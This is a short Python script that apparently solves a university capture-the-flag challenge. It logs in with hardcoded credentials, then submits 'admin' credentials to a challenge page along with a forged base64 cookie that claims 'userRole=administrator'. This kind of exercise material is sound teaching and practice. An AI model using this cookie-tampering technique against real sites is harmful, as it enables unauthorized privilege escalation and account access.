import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/d779e34a54172cbc245300d3bc22937090ebd3769466a501a5e7ac605b9f34b7"

postData = {"subName":"admin", "subPassword":"-158564824159485122990868502888142162287"}
cookieData = {"checksum":"dXNlclJvbGU9YWRtaW5pc3RyYXRvcg=="}
response2 = session.post(targetUrl, data=postData, cookies=cookieData)
print(response2.text)
